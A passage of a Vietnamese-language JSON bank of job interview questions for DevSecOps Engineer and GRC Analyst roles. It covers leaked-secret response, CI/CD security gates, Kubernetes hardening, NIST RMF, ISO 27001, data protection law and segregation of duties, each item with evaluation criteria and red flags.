          "Tuần 2-3: Nâng cấp hàng loạt (Batch Remediation): Rebuild image với base image mới nhất và cập nhật dependencies; triển khai qua canary deployment với giám sát; đội SRE và Dev phối hợp chặt chẽ",
          "Tuần 4: Xác minh và báo cáo: Quét lại toàn bộ xác nhận CVE Critical đã được vá; viết báo cáo remediation evidence cho kiểm toán viên",
          "Phòng ngừa tái phát: Thiết lập chính sách 'Image Freshness Policy' bắt buộc rebuild image tối thiểu 30 ngày/lần; cấu hình Admission Controller chặn triển khai image cũ hơn 90 ngày"
        ],
        "followUps": [
          "Tại sao việc rebuild image định kỳ (Base Image Refresh) lại quan trọng hơn việc chỉ vá từng CVE đơn lẻ?",
          "Cách thiết lập chính sách tự động phát hiện và cảnh báo container image lỗi thời (Image Age Alert)?"
        ],
        "tags": [
          "SOC 2 Remediation",
          "Image Freshness",
          "Batch Vulnerability Fix",
          "Admission Controller Age Check",
          "Compliance Evidence"
        ],
        "sourceRefs": [
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Yêu cầu toàn bộ 40% services dừng hoạt động cùng lúc để nâng cấp gây gián đoạn dịch vụ nghiêm trọng"
        ]
      },
      {
        "id": "DEVSECOPS-SCEN-06",
        "role": "DevSecOps Engineer",
        "category": "scenario",
        "difficulty": "advanced",
        "seniority": "middle",
        "question": "Tình huống: Một lập trình viên thực tập vô tình commit AWS Access Key và Secret Key vào một public GitHub repository. Công cụ GitGuardian phát hiện và gửi cảnh báo sau 3 phút. Access Key này gắn với một IAM User có quyền đọc/ghi vào S3 bucket chứa dữ liệu khách hàng. Hành động khẩn cấp của em là gì?",
        "evaluationCriteria": [
          "Phút 0-5: Lập tức vào AWS Console/CLI vô hiệu hóa Access Key ngay lập tức (Deactivate key rồi Delete key); không chờ xác nhận vì mỗi giây đều có thể bị tin tặc tự động quét GitHub và khai thác",
          "Phút 5-15: Kiểm tra CloudTrail logs của Access Key đó: Có bất kỳ API call bất thường nào từ IP lạ không (ListBuckets, GetObject, PutObject)? Xác định phạm vi dữ liệu bị ảnh hưởng",
          "Phút 15-30: Git history rewrite: Sử dụng `git filter-branch` hoặc BFG Repo Cleaner để xóa vĩnh viễn secret khỏi lịch sử Git; Force push lên remote",
          "Sau sự cố: Chuyển sang sử dụng IAM Roles với STS temporary credentials thay vì Access Keys tĩnh; bắt buộc Pre-commit hook `detect-secrets` cho toàn tổ chức"
        ],
        "followUps": [
          "Tại sao việc chỉ xóa commit chứa secret trên GitHub là KHÔNG ĐỦ vì Git history vẫn lưu giữ?",
          "Bao lâu thì bọn bot tự động trên Internet quét được secret mới được push lên GitHub public?"
        ],
        "tags": [
          "Secret Leak Emergency",
          "CloudTrail Investigation",
          "Git History Rewrite",
          "BFG Repo Cleaner",
          "Pre-commit Hooks"
        ],
        "sourceRefs": [
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Chỉ xóa file chứa secret trong commit mới nhưng không rewrite Git history và không kiểm tra CloudTrail"
        ]
      },
      {
        "id": "DEVSECOPS-CV-01",
        "role": "DevSecOps Engineer",
        "category": "cv_validation",
        "difficulty": "advanced",
        "seniority": "middle",
        "question": "Trong CV em có ghi kinh nghiệm thiết kế và vận hành pipeline CI/CD an toàn cho tổ chức: Hãy mô tả kiến trúc pipeline đó từ lúc developer commit code đến khi ứng dụng chạy trên Production với đầy đủ các security gates?",
        "evaluationCriteria": [
          "Mô tả chi tiết các công cụ sử dụng (Jenkins/GitHub Actions/GitLab CI, Trivy, Semgrep, ZAP, DefectDojo)",
          "Cách thiết kế gate policy: Rule nào block merge, rule nào advisory, ngưỡng severity threshold",
          "Kết quả đạt được: Thời gian pipeline trung bình, tỷ lệ lỗi bảo mật phát hiện sớm tăng bao nhiêu %"
        ],
        "followUps": [
          "Thách thức kỹ thuật lớn nhất khi triển khai pipeline đó là gì?",
          "Cách em thuyết phục đội Dev chấp nhận thêm security steps vào pipeline của họ?"
        ],
        "tags": [
          "CI/CD Architecture",
          "Security Gates",
          "Pipeline Optimization",
          "Developer Adoption"
        ],
        "sourceRefs": [
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Khai man kinh nghiệm tích hợp bảo mật vào pipeline CI/CD, không nắm rõ cách cấu hình các công cụ quét"
        ]
      },
      {
        "id": "DEVSECOPS-CV-02",
        "role": "DevSecOps Engineer",
        "category": "cv_validation",
        "difficulty": "advanced",
        "seniority": "senior_lead",
        "question": "CV có đề cập kinh nghiệm triển khai Kubernetes trên Production: Hãy chia sẻ về cách em cấu hình bảo mật cho cụm Kubernetes (RBAC, Network Policies, Pod Security, Admission Controllers) trong một dự án thực tế?",
        "evaluationCriteria": [
          "Kiến trúc cụm: Multi-tenant hay dedicated clusters, số lượng nodes, namespace strategy",
          "Cấu hình bảo mật: RBAC granularity, NetworkPolicy default deny, PodSecurity Standards enforcement mode",
          "Giám sát: Công cụ runtime protection đã triển khai, cách tích hợp với hệ thống giám sát tập trung"
        ],
        "followUps": [
          "Lỗi cấu hình Kubernetes nguy hiểm nhất mà em từng phát hiện và khắc phục?",
          "Cách quản lý secrets trong Kubernetes một cách an toàn?"
        ],
        "tags": [
          "Kubernetes Security",
          "RBAC Design",
          "Pod Security Standards",
          "Runtime Monitoring"
        ],
        "sourceRefs": [
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Phóng đại khả năng Infrastructure as Code mà không giải thích được cơ chế Policy as Code thực tế"
        ]
      },
      {
        "id": "DEVSECOPS-CV-03",
        "role": "DevSecOps Engineer",
        "category": "cv_validation",
        "difficulty": "intermediate",
        "seniority": "junior",
        "question": "Em ghi nhận có kinh nghiệm viết Infrastructure as Code (Terraform/CloudFormation) và áp dụng Policy-as-Code: Hãy mô tả một module Terraform mà em đã tự viết kèm theo cách kiểm tra tuân thủ bảo mật tự động?",
        "evaluationCriteria": [
          "Loại tài nguyên: Module quản lý VPC, S3, RDS hay EKS; các tham số bảo mật mặc định đã được hardcoded (encryption, logging)",
          "Policy-as-Code: Checkov hoặc tfsec rules đã áp dụng; quy tắc tùy biến nào đã viết thêm",
          "Quy trình sử dụng: Đội phát triển sử dụng module này như thế nào, cách họ override tham số có kiểm soát"
        ],
        "followUps": [
          "Cách em xử lý khi một đội dev cần tạo tài nguyên không nằm trong Golden Modules có sẵn?",
          "Configuration Drift đã từng xảy ra chưa và cách xử lý?"
        ],
        "tags": [
          "Terraform Security",
          "Policy-as-Code",
          "Golden Modules",
          "Compliance Automation"
        ],
        "sourceRefs": [
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Không chứng minh được khả năng đo lường và cải tiến chỉ số bảo mật trong pipeline phát triển"
        ]
      },
      {
        "id": "DEVSECOPS-CV-04",
        "role": "DevSecOps Engineer",
        "category": "cv_validation",
        "difficulty": "advanced",
        "seniority": "middle",
        "question": "Trong hồ sơ có ghi em từng xử lý sự cố rò rỉ secrets trong code repository: Hãy chia sẻ quy trình phản ứng khẩn cấp mà em đã thực hiện từ lúc nhận cảnh báo đến khi hoàn tất khắc phục?",
        "evaluationCriteria": [
          "Thời gian phản ứng: Bao lâu từ lúc nhận alert đến lúc vô hiệu hóa credential bị lộ",
          "Phạm vi điều tra: Kiểm tra log sử dụng credential bị lộ, xác định có bị khai thác hay chưa",
          "Biện pháp phòng ngừa sau sự cố: Pre-commit hooks, training cho dev, chuyển sang dynamic secrets"
        ],
        "followUps": [
          "Bài học lớn nhất rút ra từ sự cố đó?",
          "Cách em đảm bảo sự cố tương tự không tái diễn?"
        ],
        "tags": [
          "Secret Leak Response",
          "Incident Timeline",
          "Root Cause Analysis",
          "Preventive Measures"
        ],
        "sourceRefs": [
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Chỉ biết chạy các công cụ quét container mà không hiểu bản chất các lỗ hổng CVE phát hiện được"
        ]
      },
      {
        "id": "DEVSECOPS-CV-05",
        "role": "DevSecOps Engineer",
        "category": "cv_validation",
        "difficulty": "intermediate",
        "seniority": "middle",
        "question": "CV có nêu em tham gia xây dựng văn hóa DevSecOps cho tổ chức: Hãy chia sẻ cách em đã huấn luyện và thay đổi nhận thức bảo mật cho các lập trình viên trong công ty?",
        "evaluationCriteria": [
          "Phương pháp đào tạo: Workshop thực hành, CTF nội bộ, Lunch & Learn sessions, Secure Coding tournaments",
          "Đo lường hiệu quả: Số lượng lỗi bảo mật trong code giảm bao nhiêu % sau chương trình đào tạo",
          "Thách thức: Cách thuyết phục những lập trình viên kỳ cựu thay đổi thói quen code cũ"
        ],
        "followUps": [
          "Hoạt động đào tạo nào mang lại hiệu quả cao nhất theo kinh nghiệm của em?",
          "Cách duy trì động lực học tập bảo mật dài hạn cho đội ngũ?"
        ],
        "tags": [
          "Security Training",
          "Culture Change",
          "Developer Engagement",
          "Metrics-driven Improvement"
        ],
        "sourceRefs": [
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Phóng đại kinh nghiệm văn hóa DevSecOps mà không có ví dụ cụ thể về sự thay đổi hành vi của đội ngũ"
        ]
      },
      {
        "id": "DEVSECOPS-BEHAV-01",
        "role": "DevSecOps Engineer",
        "category": "behavioral",
        "difficulty": "advanced",
        "seniority": "middle",
        "question": "DevSecOps Engineer thường xuyên đứng giữa hai áp lực đối lập: Đội Dev muốn release nhanh nhất có thể, còn đội Security muốn kiểm tra kỹ lưỡng nhất có thể. Em làm thế nào để cân bằng hai mục tiêu tưởng chừng mâu thuẫn này?",
        "evaluationCriteria": [
          "Thấu hiểu cả hai phía: Dev chịu áp lực deadline kinh doanh; Security chịu trách nhiệm bảo vệ dữ liệu khách hàng; cả hai đều chính đáng",
          "Giải pháp kỹ thuật: Tự động hóa tối đa kiểm thử bảo mật để không tốn thời gian thủ công; incremental scanning chỉ quét code mới; risk-based prioritization chỉ chặn lỗi thật sự nguy hiểm",
          "Giao tiếp và đồng thuận: Xây dựng thỏa thuận về Security SLA được cả PM và Security Lead ký duyệt; minh bạch về những gì bị chặn và lý do cụ thể"
        ],
        "followUps": [
          "Khi hai bên không thể thống nhất, em đưa ra quyết định cuối cùng dựa trên nguyên tắc gì?",
          "Cách biến an ninh thành lợi thế cạnh tranh thay vì gánh nặng?"
        ],
        "tags": [
          "Balancing Speed and Security",
          "Risk-based Decision Making",
          "Stakeholder Alignment"
        ],
        "sourceRefs": [
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Luôn luôn đứng về phía Dev bỏ qua bảo mật hoặc luôn luôn chặn release gây ức chế"
        ]
      },
      {
        "id": "DEVSECOPS-BEHAV-02",
        "role": "DevSecOps Engineer",
        "category": "behavioral",
        "difficulty": "intermediate",
        "seniority": "junior",
        "question": "Khi em phát hiện một lập trình viên senior đã tắt tính năng quét bảo mật trong pipeline CI của dự án họ phụ trách vì 'làm chậm quá', em xử lý tình huống này ra sao?",
        "evaluationCriteria": [
          "Tiếp cận riêng tư và tôn trọng: Không công khai chỉ trích; tìm hiểu lý do cụ thể (pipeline chậm thật sự hay chỉ vì bực mình với false positives)",
          "Giải quyết nguyên nhân gốc: Nếu pipeline chậm thật, cùng họ tối ưu hóa (incremental scan, parallel steps); nếu false positive nhiều, cùng tinh chỉnh ruleset",
          "Nhắc nhở về chính sách: Giải thích rằng security gates là chính sách bắt buộc của tổ chức; cung cấp giải pháp thay thế tốt hơn thay vì tắt hoàn toàn"
        ],
        "followUps": [
          "Nếu họ vẫn kiên quyết từ chối bật lại security scan, em leo thang vấn đề lên ai?",
          "Cách thiết kế pipeline mà dev không thể tự ý tắt security steps?"
        ],
        "tags": [
          "Policy Enforcement",
          "Constructive Confrontation",
          "Root Cause Resolution"
        ],
        "sourceRefs": [
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Nhắm mắt bỏ qua hoặc ngược lại gửi email CC toàn công ty tố cáo đồng nghiệp"
        ]
      },
      {
        "id": "DEVSECOPS-BEHAV-03",
        "role": "DevSecOps Engineer",
        "category": "behavioral",
        "difficulty": "advanced",
        "seniority": "senior_lead",
        "question": "Trong một dự án lớn, công cụ SCA phát hiện một thư viện mã nguồn mở cốt lõi (mà toàn bộ hệ thống phụ thuộc) có giấy phép GPL-3.0, trong khi sản phẩm thương mại của công ty không tương thích với GPL. Việc thay thế thư viện này sẽ mất 3 tháng công sức. Em tư vấn cho Ban Giám đốc ra sao?",
        "evaluationCriteria": [
          "Trình bày rủi ro pháp lý rõ ràng: GPL-3.0 yêu cầu bất kỳ phần mềm phái sinh nào cũng phải mở mã nguồn theo cùng giấy phép; vi phạm có thể dẫn đến kiện tụng bản quyền phần mềm và buộc phải mở mã nguồn toàn bộ sản phẩm thương mại",
          "Phân tích kỹ thuật: Đánh giá mức độ tích hợp của thư viện đó (linking tĩnh hay động, API boundary rõ ràng hay không)",
          "Đề xuất lộ trình: Ngắn hạn - tham vấn luật sư sở hữu trí tuệ; Trung hạn - xây dựng abstraction layer để cô lập phụ thuộc; Dài hạn - thay thế bằng thư viện có giấy phép tương thích (MIT, Apache 2.0)"
        ],
        "followUps": [
          "Sự khác biệt giữa giấy phép Copyleft (GPL) và Permissive (MIT, Apache 2.0)?",
          "Tại sao việc quét giấy phép phần mềm (License Compliance) cần được thực hiện sớm trong SDLC?"
        ],
        "tags": [
          "License Compliance",
          "GPL Risk",
          "Open Source Governance",
          "Legal Risk Communication"
        ],
        "sourceRefs": [
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Bỏ qua cảnh báo giấy phép vì cho rằng 'chả ai kiểm tra đâu'"
        ]
      },
      {
        "id": "DEVSECOPS-BEHAV-04",
        "role": "DevSecOps Engineer",
        "category": "behavioral",
        "difficulty": "intermediate",
        "seniority": "middle",
        "question": "Công nghệ DevOps và bảo mật liên tục ra mắt các công cụ mới mỗi tháng (eBPF security, AI-powered code review, Software Supply Chain). Em duy trì việc cập nhật kiến thức chuyên sâu và đánh giá công nghệ mới như thế nào?",
        "evaluationCriteria": [
          "Xây dựng thói quen học tập có hệ thống: Theo dõi các nguồn uy tín (tl;dr sec newsletter, CloudSecList, DevSecOps Days talks), dành 2-3 giờ/tuần thực hành trên lab cá nhân",
          "Đánh giá công nghệ mới một cách thận trọng: Không chạy theo trend mù quáng; kiểm tra community adoption, tài liệu, tính ổn định và khả năng tích hợp với stack hiện tại trước khi đề xuất",
          "Chia sẻ lại: Viết blog kỹ thuật nội bộ hoặc trình bày tại buổi Tech Talk của công ty"
        ],
        "followUps": [
          "Một công nghệ DevSecOps mới nhất khiến em hào hứng nhất gần đây là gì?",
          "Cách cân bằng giữa việc duy trì hệ thống hiện tại và khám phá công nghệ mới?"
        ],
        "tags": [
          "Continuous Learning",
          "Technology Evaluation",
          "Knowledge Sharing",
          "Balanced Innovation"
        ],
        "sourceRefs": [
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Ngại học hỏi công nghệ mới, áp dụng máy móc các giải pháp bảo mật cũ kỹ vào môi trường cloud-native hiện đại"
        ]
      },
      {
        "id": "DEVSECOPS-BEHAV-05",
        "role": "DevSecOps Engineer",
        "category": "behavioral",
        "difficulty": "advanced",
        "seniority": "middle",
        "question": "Khi một sự cố bảo mật trên Production xảy ra do một lỗ hổng mà pipeline CI/CD của em phụ trách đã không phát hiện được (ví dụ: một Business Logic Flaw mà SAST/DAST không bắt được), em đối diện với trách nhiệm của mình như thế nào?",
        "evaluationCriteria": [
          "Nhận trách nhiệm chuyên môn: Không đổ lỗi cho công cụ hay cho dev; phân tích thẳng thắn tại sao pipeline không phát hiện được (hạn chế cố hữu của SAST đối với business logic)",
          "Hành động khắc phục: Bổ sung thêm lớp kiểm tra phù hợp (manual security review checklist cho các tính năng tài chính nhạy cảm, integration security tests)",
          "Cải tiến liên tục: Cập nhật pipeline và quy trình review; chia sẻ bài học kinh nghiệm (blameless post-mortem) với toàn đội"
        ],
        "followUps": [
          "Tại sao không có pipeline nào có thể phát hiện 100% lỗ hổng và làm thế nào để truyền thông điều này một cách trung thực?",
          "Cách xây dựng chiến lược 'Defense in Depth' cho DevSecOps?"
        ],
        "tags": [
          "Accountability",
          "Pipeline Limitations",
          "Continuous Improvement",
          "Blameless Post-Mortem"
        ],
        "sourceRefs": [
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Đổ lỗi cho SAST/DAST hoặc cho rằng business logic flaw không thuộc trách nhiệm DevSecOps"
        ]
      }
    ]
  },
  {
    "role": "GRC Analyst",
    "group": "cybersecurity",
    "groupLabel": "An toàn thông tin (Cybersecurity)",
    "aliases": [
      "grc analyst",
      "governance risk compliance",
      "chuyen vien grc",
      "compliance analyst",
      "it compliance",
      "chinh sach an toan thong tin",
      "security governance analyst"
    ],
    "questions": [
      {
        "id": "GRC-FOUND-01",
        "role": "GRC Analyst",
        "category": "foundation",
        "difficulty": "basic",
        "seniority": "fresher_intern",
        "question": "Trong GRC Analyst, phân biệt GRC Framework, Governance, Risk Management, Compliance; mô tả khi nào em áp dụng chúng trong bài tập.",
        "evaluationCriteria": [
          "Giải thích đúng ý nghĩa cơ bản của GRC Framework.",
          "Phân biệt được các khái niệm liên quan Governance, Risk Management, Compliance ở mức nhập môn.",
          "Đưa ra được ví dụ học tập phù hợp với vị trí GRC Analyst."
        ],
        "followUps": [
          "Nếu mới học GRC Framework, em sẽ dùng ví dụ đơn giản nào để tự kiểm tra mình đã hiểu?"
        ],
        "tags": [
          "GRC Framework",
          "Governance",
          "Risk Management",
          "Compliance",
          "Accountability"
        ],
        "sourceRefs": [
          "https://www.nist.gov/cyberframework",
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Nhầm lẫn khái niệm nền tảng hoặc không thể đưa ra ví dụ cơ bản."
        ]
      },
      {
        "id": "GRC-FOUND-02",
        "role": "GRC Analyst",
        "category": "foundation",
        "difficulty": "advanced",
        "seniority": "middle",
        "question": "Khung Quản lý Rủi ro NIST RMF (Risk Management Framework - SP 800-37): Bảy bước (Prepare, Categorize, Select, Implement, Assess, Authorize, Monitor) và cách áp dụng cho một hệ thống thông tin cụ thể?",
        "evaluationCriteria": [
          "Categorize: Phân loại hệ thống theo mức độ tác động (Impact Level: Low, Moderate, High) dựa trên CIA triad",
          "Select & Implement: Chọn bộ kiểm soát an ninh phù hợp từ NIST SP 800-53 và triển khai; Assess: Đánh giá hiệu quả các kiểm soát đã triển khai",
          "Authorize: Người có thẩm quyền (AO - Authorizing Official) ký phê duyệt chấp nhận rủi ro còn lại; Monitor: Giám sát liên tục hiệu quả các kiểm soát sau khi hệ thống đi vào vận hành"
        ],
        "followUps": [
          "Ai là Authorizing Official và tại sao họ phải chịu trách nhiệm pháp lý về quyết định chấp nhận rủi ro?",
          "NIST RMF khác gì so với ISO 27005 Risk Management?"
        ],
        "tags": [
          "NIST RMF",
          "SP 800-37",
          "SP 800-53",
          "Risk Categorization",
          "Authorization to Operate"
        ],
        "sourceRefs": [
          "https://csrc.nist.gov/projects/risk-management/about-rmf",
          "https://www.nist.gov/cyberframework"
        ],
        "redFlags": [
          "Bỏ qua bước 'Prepare' và 'Monitor' dẫn đến quy trình quản lý rủi ro không liên tục"
        ]
      },
      {
        "id": "GRC-FOUND-03",
        "role": "GRC Analyst",
        "category": "foundation",
        "difficulty": "advanced",
        "seniority": "middle",
        "question": "Hệ thống Quản lý An toàn Thông tin ISO 27001:2022 (ISMS): Cấu trúc của các điều khoản bắt buộc (Clauses 4-10) và Phụ lục A (93 kiểm soát trong 4 chủ đề) thay đổi gì so với phiên bản 2013?",
        "evaluationCriteria": [
          "Clauses 4-10: Bối cảnh tổ chức (4), Lãnh đạo (5), Hoạch định (6), Hỗ trợ (7), Vận hành (8), Đánh giá hiệu quả (9), Cải tiến (10) theo vòng lặp PDCA",
          "ISO 27001:2022 Annex A: Giảm từ 114 kiểm soát (14 lĩnh vực) xuống 93 kiểm soát (4 chủ đề: Organizational, People, Physical, Technological); bổ sung 11 kiểm soát mới (Cloud security, Threat intelligence, Data masking, ICT readiness for business continuity)",
          "Đánh giá Tuyên bố Khả dụng (Statement of Applicability - SoA): Tài liệu bắt buộc liệt kê từng kiểm soát Annex A, lý do áp dụng hoặc loại trừ, và phương thức triển khai"
        ],
        "followUps": [
          "Sự khác biệt giữa chứng nhận (Certification) và tuân thủ (Conformity) ISO 27001?",
          "Quy trình đánh giá nội bộ (Internal Audit) và đánh giá bên ngoài (Certification Audit Stage 1 & 2)?"
        ],
        "tags": [
          "ISO 27001:2022",
          "ISMS",
          "Statement of Applicability",
          "Annex A Controls",
          "PDCA Cycle"
        ],
        "sourceRefs": [
          "https://www.iso.org/standard/27001",
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Chỉ tập trung vào chứng chỉ mà không xây dựng hệ thống quản lý thực sự vận hành"
        ]
      },
      {
        "id": "GRC-FOUND-04",
        "role": "GRC Analyst",
        "category": "foundation",
        "difficulty": "intermediate",
        "seniority": "junior",
        "question": "Đánh giá Rủi ro An ninh Thông tin (Information Security Risk Assessment): Phương pháp định tính (Qualitative: Heat Map / Risk Matrix) vs Định lượng (Quantitative: ALE = SLE × ARO theo FAIR Model)?",
        "evaluationCriteria": [
          "Qualitative: Sử dụng ma trận rủi ro (Likelihood × Impact) xếp hạng High/Medium/Low; dễ hiểu, nhanh nhưng chủ quan",
          "Quantitative (FAIR - Factor Analysis of Information Risk): Tính toán Tổn thất Dự kiến Hàng năm (ALE) = Mức tổn thất đơn lẻ (SLE) × Tần suất xảy ra hàng năm (ARO); cho ra con số tài chính cụ thể giúp so sánh ROI đầu tư bảo mật",
          "Thực tế: Hầu hết tổ chức kết hợp cả hai; dùng Qualitative để sàng lọc ban đầu, sau đó Quantitative phân tích sâu cho các rủi ro trọng yếu"
        ],
        "followUps": [
          "Tại sao CISO luôn cần số liệu tài chính cụ thể thay vì chỉ nói 'rủi ro cao'?",
          "Mô hình FAIR phân tích các yếu tố đầu vào (Threat Event Frequency, Vulnerability, Loss Magnitude) ra sao?"
        ],
        "tags": [
          "Risk Assessment",
          "Qualitative vs Quantitative",
          "FAIR Model",
          "ALE SLE ARO",
          "Risk Matrix"
        ],
        "sourceRefs": [
          "https://csrc.nist.gov/projects/risk-management/about-rmf",
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Chỉ dùng ma trận rủi ro Red/Yellow/Green đơn giản cho mọi quyết định đầu tư triệu USD"
        ]
      },
      {
        "id": "GRC-FOUND-05",
        "role": "GRC Analyst",
        "category": "foundation",
        "difficulty": "advanced",
        "seniority": "senior_lead",
        "question": "Các quy định bảo vệ dữ liệu cá nhân: So sánh GDPR (EU), Nghị định 13/2023/NĐ-CP (Việt Nam) và PDPA (Singapore/Thái Lan) về quyền của chủ thể dữ liệu, nghĩa vụ thông báo vi phạm và mức xử phạt?",
        "evaluationCriteria": [
          "GDPR: Quyền truy cập, xóa, di chuyển dữ liệu; thông báo vi phạm trong 72 giờ cho cơ quan quản lý; phạt tối đa 4% doanh thu toàn cầu hoặc 20 triệu EUR",
          "Nghị định 13/2023/NĐ-CP (Việt Nam): Yêu cầu đồng ý rõ ràng của chủ thể dữ liệu; nghĩa vụ thông báo cho Bộ Công an trong vòng 72 giờ khi phát hiện vi phạm; áp dụng cho cả tổ chức nước ngoài xử lý dữ liệu người Việt Nam",
          "PDPA Singapore: Phạt tối đa 10% doanh thu hàng năm hoặc 1 triệu SGD; yêu cầu lưu giữ dữ liệu có mục đích rõ ràng và bổ nhiệm DPO (Data Protection Officer)"
        ],
        "followUps": [
          "Tại sao một công ty Việt Nam có người dùng châu Âu vẫn phải tuân thủ GDPR?",
          "Cách triển khai quyền 'Quyền yêu cầu xóa dữ liệu' (Right to Erasure) trên hệ thống phần mềm phức tạp?"
        ],
        "tags": [
          "GDPR",
          "Nghị định 13",
          "PDPA",
          "Data Subject Rights",
          "Breach Notification",
          "Cross-Border Compliance"
        ],
        "sourceRefs": [
          "https://gdpr-info.eu/",
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Cho rằng quy định bảo vệ dữ liệu cá nhân chỉ áp dụng cho các công ty châu Âu"
        ]
      },
      {
        "id": "GRC-FOUND-06",
        "role": "GRC Analyst",
        "category": "foundation",
        "difficulty": "intermediate",
        "seniority": "junior",
        "question": "Kiểm soát Nội bộ và Phân tách Nhiệm vụ (Segregation of Duties - SoD): Tại sao một nhân viên không được phép vừa phê duyệt giao dịch vừa thực hiện giao dịch và vừa kiểm tra giao dịch đó?",
        "evaluationCriteria": [
          "SoD chia ba chức năng: Ủy quyền (Authorization), Thực hiện (Custody/Execution), và Ghi nhận (Recording); không ai nắm giữ cả ba để ngăn chặn gian lận",
          "Ví dụ IT: Lập trình viên không nên có quyền deploy code lên Production mà không qua bước review và phê duyệt của người khác; DBA không nên tự cấp quyền admin cho chính mình",
          "Kiểm soát bù trừ: Trong tổ chức nhỏ thiếu nhân sự không thể tách hoàn toàn, áp dụng Detective Controls (ghi log mọi hành vi, rà soát định kỳ, giám sát bất thường)"
        ],
        "followUps": [
          "Xung đột SoD phổ biến nhất trong quyền hạn hệ thống ERP (SAP) là gì?",
          "Tại sao SoD là yêu cầu bắt buộc trong SOX Compliance (Đạo luật Sarbanes-Oxley)?"
        ],
        "tags": [
          "Segregation of Duties",
          "Internal Controls",
          "Fraud Prevention",
          "Compensating Controls",
          "SOX Compliance"
        ],
        "sourceRefs": [
          "https://www.iso.org/standard/27001",
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Cho phép một người vừa tạo tài khoản người dùng vừa phê duyệt quyền truy cập và vừa kiểm tra nhật ký"
        ]
      },
      {
        "id": "GRC-PRAC-01",
        "role": "GRC Analyst",
        "category": "practical_skills",
        "difficulty": "basic",
        "seniority": "fresher_intern",
        "question": "Mô phỏng Risk Register (Risk Treatment Plan, Heat Map, Key Risk Indicators, Residual Risk) cho GRC Analyst: em chuẩn bị gì, thao tác nào và đo kết quả ra sao?",
        "evaluationCriteria": [
          "Nêu mục đích sử dụng Risk Register trong một bài tập hoặc dự án nhỏ.",
          "Trình bày được các bước thực hiện theo thứ tự và phù hợp với Intern/Fresher.",
          "Đề xuất được cách kiểm tra kết quả và biết khi nào cần tra cứu hoặc hỏi người hướng dẫn."
        ],
        "followUps": [
          "Nếu kết quả chưa đúng, em sẽ kiểm tra bước nào đầu tiên và dựa vào dấu hiệu gì?"
        ],
        "tags": [
          "Risk Register",
          "Risk Treatment Plan",
          "Heat Map",
          "Key Risk Indicators",
          "Residual Risk"
        ],
        "sourceRefs": [
          "https://csrc.nist.gov/projects/risk-management/about-rmf",
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Không xác định được mục tiêu thực hành hoặc nêu cách kiểm tra kết quả không phù hợp."
        ]
      },
      {
        "id": "GRC-PRAC-02",
        "role": "GRC Analyst",
        "category": "practical_skills",
        "difficulty": "intermediate",
        "seniority": "fresher_intern",
        "question": "Bài tập GRC Analyst: dựa trên Policy Framework, phối hợp Standards vs Procedures, Policy Hierarchy, Employee Communication; đầu ra sẽ được kiểm tra bằng tiêu chí nào?",
        "evaluationCriteria": [
          "Nêu mục đích sử dụng Policy Framework trong một bài tập hoặc dự án nhỏ.",
          "Trình bày được các bước thực hiện theo thứ tự và phù hợp với Intern/Fresher.",
          "Đề xuất được cách kiểm tra kết quả và biết khi nào cần tra cứu hoặc hỏi người hướng dẫn."
        ],
        "followUps": [
          "Nếu kết quả chưa đúng, em sẽ kiểm tra bước nào đầu tiên và dựa vào dấu hiệu gì?"
        ],
        "tags": [
          "Policy Framework",
          "Standards vs Procedures",
          "Policy Hierarchy",
          "Employee Communication"
        ],
        "sourceRefs": [
          "https://www.iso.org/standard/27001",
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Không xác định được mục tiêu thực hành hoặc nêu cách kiểm tra kết quả không phù hợp."
        ]
      },
      {
        "id": "GRC-PRAC-03",
        "role": "GRC Analyst",
        "category": "practical_skills",
        "difficulty": "advanced",
        "seniority": "senior_lead",
        "question": "Thiết kế và Triển khai Chương trình Kiểm toán Nội bộ An ninh Thông tin (Internal Audit Program): Lập kế hoạch kiểm toán hàng năm dựa trên rủi ro (Risk-based Audit Plan), thực hiện kiểm toán và viết báo cáo phát hiện?",
        "evaluationCriteria": [
          "Risk-based Audit Plan: Ưu tiên kiểm toán các lĩnh vực có rủi ro cao nhất (vd: quản lý truy cập đặc quyền, backup & recovery, quản lý thay đổi) thay vì kiểm tra mọi thứ đều đều",
          "Audit Fieldwork: Thu thập bằng chứng (Evidence sampling), phỏng vấn nhân sự, kiểm tra cấu hình hệ thống, đối chiếu tài liệu với thực tế vận hành",
          "Audit Report: Mỗi phát hiện ghi rõ Condition (tình trạng thực tế), Criteria (tiêu chuẩn yêu cầu), Cause (nguyên nhân gốc rễ), Consequence (hậu quả tiềm ẩn) và Recommendation (khuyến nghị khắc phục kèm thời hạn)"
        ],
        "followUps": [
          "Cách xử lý khi bộ phận bị kiểm toán không hợp tác hoặc cung cấp bằng chứng sai lệch?",
          "Khác biệt giữa Non-conformity (không phù hợp) và Observation (quan sát/khuyến nghị)?"
        ],
        "tags": [
          "Internal Audit Program",
